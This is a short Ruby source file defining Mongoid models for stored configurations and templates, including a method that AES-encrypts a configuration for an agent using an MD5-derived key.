require 'mongoid'

require 'rcs-common/crypt'

#module RCS
#module DB

class Configuration
  include Mongoid::Document
  include Mongoid::Timestamps
  include RCS::Crypt

  field :desc, type: String
  field :user, type: String
  field :saved, type: Integer
  field :sent, type: Integer
  field :activated, type: Integer

  field :config, type: String   #json
  
  embedded_in :item

  def encrypted_config(confkey)
    # encrypt the config for the agent using the confkey
    aes_encrypt(self.config + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
  end
end


class Template
  include Mongoid::Document
  include Mongoid::Timestamps

  field :desc, type: String
  field :user, type: String

  field :config, type: String   #json

  store_in :templates
end


#end # ::DB
#end # ::RCS